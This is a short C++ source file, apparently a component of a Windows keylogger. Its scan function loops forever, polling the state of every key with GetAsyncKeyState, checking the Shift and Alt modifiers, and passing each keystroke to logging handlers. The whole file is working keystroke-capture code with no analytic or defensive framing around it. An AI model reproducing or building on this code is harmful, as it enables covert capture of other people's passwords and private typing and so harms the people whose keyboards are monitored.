#include "pch.h"
#include "keyscan.h"

//Keyboard scanner
void keyscan::scan() {
	INIT_LOG;
	char KEY = 'x';
	while (true) {
		Sleep(1);
		for (int KEY = 8; KEY <= 255; KEY++)
			if (GetAsyncKeyState(KEY) == -32767) {
				if (GetAsyncKeyState(VK_SHIFT))
					shift(KEY);
				else if (GetAsyncKeyState(VK_MENU))
					altgr(KEY);
				else
					mless(KEY);
			}
	}
}
